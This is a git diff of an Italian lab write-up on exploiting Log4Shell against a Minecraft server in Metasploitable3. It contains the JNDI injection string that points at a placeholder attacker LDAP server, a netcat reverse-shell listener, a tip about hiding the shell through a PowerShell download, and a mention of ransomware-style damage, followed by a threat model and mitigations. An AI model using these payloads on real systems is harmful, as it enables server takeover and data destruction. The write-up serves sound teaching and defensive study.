@@ -17,14 +17,12 @@ L'attacco parte sulla creazione di un server LDAP che sarà il punto di ingresso
 Viene in oltre messo su un server http (in questo caso viene usato un server python) che sarà l'esecutore dell'iniezione del codice malevolo.
 Già questo basterebbe per la compromissione del sistema attaccato, tuttavia si è voluto anche creare una classe Java che consenta anche la Remote Code Execution tramite reverse shell. Perciò risulta necessaria la creazione di un ulteriore server TCP, nel nostro caso useremo Netcat.
 
-** **: Nella fase di , una volta scelto il target, si deve pensare ad una strategia di anonimizzazione, s
-
 **Injection**: La fase di iniezione consiste di inviare via chat di gioco, un ????????? così composto: `${jndi:ldap://ip_serverLDAP_attaccante:porta_ldap/NomeClasseJavaMalevola}`, ciò farà si che il framework inizi una connessione LDAP al server dell'attaccante.
 Non ci sono particolari complicanze in questa fase e questo messaggio può essere potenzialmente inviato da qualsiasi giocatore e da qualsiasi IP.
 
 Una volta che la connessione LDAP è stabilita con l'attaccante, il server rigetterà la richiesta al server HTTP che userà la classe Java (precompilata) come response al server vittima.
 
-Il server vittima ricevuta la classe, deserializzerà il contenuto ed eseguirà il codice all'interno, nel nostro caso, come già anticipato, forzerà il server ad eseguire una nuova connessione TCP al server netcat aprendo una reverse shell.
+Il server vittima ricevuta la classe ne eseguirà il codice all'interno, nel nostro caso, come già anticipato, forzerà il server ad eseguire una nuova connessione TCP al server netcat aprendo una reverse shell con l'attaccante.
 
 A questo punto il sistema attaccato sarà nel completo controllo dell'attaccante e potrà eseguire tutte le operazioni che vorrà, ad esempio installando un malware, creare persistenza, effettuare movimenti laterali ecc...
 
@@ -86,16 +84,23 @@ netcat -lnvp <porta>
 ${{\color{yellowgreen}{{\textbf{\textsf{Possibile raggiro:}}}}}}$ Chiaramente questo non ha a che fare con la buona riuscita dell'attacco ma solo ha solo scopo di ridurre la tracciabilità dello stesso. Si può quindi, riscrivendo la classe Java, invece di eseguire direttamente una reverse shell sul server attaccato, la si può far scaricare tramite anche uno script powershell ed eseguirla in modalità nascosta senza impattare il server di gioco.
 ---
 ##### [1](#poc-e-problematiche-rilevate): Quasi tutti i server di gioco sono impostati con la porta *well-known* '25565', se non diversamente configurati, anche nel nostro caso si è proceduto a lasciare la porta predefinita.
-##### [2](#problematiche-e-criticità-riscontrate): Questa modifica è stata effettuata sul file `server.proprities` contenente la configurazione di base del server, alla riga `max-tick` si è sostiuito il valore in '-1'.
+##### [2](#problematiche-e-criticità-riscontrate): Questa modifica è stata effettuata sul file `server.properties` contenente la configurazione di base del server, alla riga `max-tick-time` si è sostituito il valore in '-1'.
 ---
 # Treath model, mitigazioni e conclusioni
 L'esecuzione di questo attacco non risulta eccessivamente ostica ma si necessita di server che in un contesto reale ad oggi difficilmente troverebbe applicazione date le patch rilasciate da Microsoft e la difficoltà di trovare, anche intenzionalmente, server vulnerabili.
 
-C'è in oltre da considerare che l'ambiente utilizzato (Metasploitable3) è preconfigurato in modo tale da avere pochissime restrizioni in merito alla sicurezza, per cui su ambienti più sicuri questo attacco comporterebbe poca se non nulla .....
-Già utilizzando una buona configurazione di un firewall si riuscirebbe a mitigare l'attacco, l'utilizzo di un ????? antivirus potrebbe rilevare la backdoor se non opportunamente mascherata. 
+L'attaccante:
+- Ha a disposizione i tool necessari tra cui la classe Java che scriverà *ad-hoc* per l'attacco.
+- Ha a disposizione un account valido nel caso in cui il server richieda la verifica dell'account Microsoft.
+- La versione del server di gioco vulnerabile (in questo caso si fa riferimento alle versioni 1.8.0 e 1.8.9) e che non abbia la patch di sicurezza.
+
+- **(!) L'attaccante può ottenere il controllo completo del sistema, effettuare movimenti laterali e di impatto**
+ 
+C'è da considerare che l'ambiente utilizzato (Metasploitable3) è preconfigurato in modo tale da avere pochissime restrizioni in merito alla sicurezza, per cui su ambienti più sicuri questo attacco comporterebbe poca se non nulla .....
+Già utilizzando una buona configurazione di un firewall si riuscirebbe a mitigare l'attacco, l'utilizzo di un EDR o antivirus potrebbe rilevare la backdoor se non opportunamente mascherata. 
 Anche Windows, in particolare con le sue versioni più aggiornate, è in grado di rilevare l'esecuzione di script malevoli.
 
-Tuttavia sotto un punto di vista dell'***impatto***, se non si è interessati a prendere il controllo completo del pc o ad un esflitrazioni di dati, modificando opportunamente la classe Java si potrebbe arrecare comunque danni tramite la cancellazione di file sensibili o alla crittazione del disco con richiesta di riscatto ecc..
+Tuttavia sotto un punto di vista dell'***impatto***, se non si è interessati a prendere il controllo completo del pc o ad un esflitrazioni di dati, modificando opportunamente la classe Java si potrebbe arrecare comunque danni tramite la cancellazione di file sensibili o alla criptazione del disco con richiesta di riscatto ecc..
 
 ---
 
